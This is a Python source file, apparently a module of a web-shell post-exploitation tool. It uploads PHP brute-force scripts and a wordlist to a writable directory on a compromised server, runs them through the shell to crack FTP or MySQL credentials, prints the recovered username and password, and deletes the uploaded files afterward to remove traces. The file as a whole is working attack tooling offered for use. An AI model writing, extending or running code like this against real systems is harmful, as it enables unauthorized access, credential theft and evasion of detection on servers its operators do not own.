from modules.shell_handler import linux
from modules.file_handler import file_handler

from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import cprint, colored


class Bruter(object):
    def help(self):
        print ''
        print '[i] Usage: @brute [service]'
        print '[i] \tftp   \t\tBrute-Force FTP Server\'s credentials'
        print '[i] \tmysql \t\tBrute-Force MySql Server\'s credentials'

    def ftp(self):
        folder = linux.get_writble_dir()
        if folder:
            self.bruter_file = folder + '/ftp.php'
            self.wordlist = folder + '/wordlist.txt'
            cprint('\n[+] Uploading the bruter/wordlist ...', 'green')
            file_handler.upload_file('modules/bruters/ftp_bruter.php', self.bruter_file)
            file_handler.upload_file('modules/bruters/wordlist.txt', self.wordlist)
            cmd = 'cd {0}; php {1}'.format(folder, self.bruter_file)
            cprint('\n[+] Brute-Forcing FTP Creds ...', 'green')
            creds = make_request.get_page_source(cmd)
            creds = ''.join(creds).split(':')
            if creds[0] == 'success':
                username = colored(creds[1], 'blue')
                password = colored(creds[2], 'blue')
                print '[+] FTP Creds Username: {0}  Password: {1}'.format(username, password)
            else:
                cprint('[!] Couldn\'t brute-force FTP credentials', 'red')

            self.clean()

    def mysql(self):
        folder = linux.get_writble_dir()
        if folder:
            self.bruter_file = folder + '/mysql.php'
            self.wordlist = folder + '/wordlist.txt'
            cprint('\n[+] Uploading the bruter/wordlist ...', 'green')
            file_handler.upload_file('modules/bruters/mysql_bruter.php', self.bruter_file)
            file_handler.upload_file('modules/bruters/wordlist.txt', self.wordlist)
            cmd = 'cd {0}; php {1}'.format(folder, self.bruter_file)
            cprint('\n[+] Brute-Forcing MySql Creds ...', 'green')
            creds = make_request.get_page_source(cmd)
            creds = ''.join(creds).split(':')
            if creds[0] == 'success':
                username = colored(creds[1], 'blue')
                password = colored(creds[2], 'blue')
                print '[+] MySql Creds Username: {0} Password: {1}'.format(username, password)
            else:
                cprint('[!] Couldn\'t brute-force MySql credentials', 'red')

            self.clean()

    def clean(self):
        clean = 'rm -f {0} {1}'.format(self.bruter_file, self.wordlist)
        cprint('\n[+] Cleaning The garbage, DONE!', 'yellow')
        make_request.get_page_source(clean)

brute = Bruter()
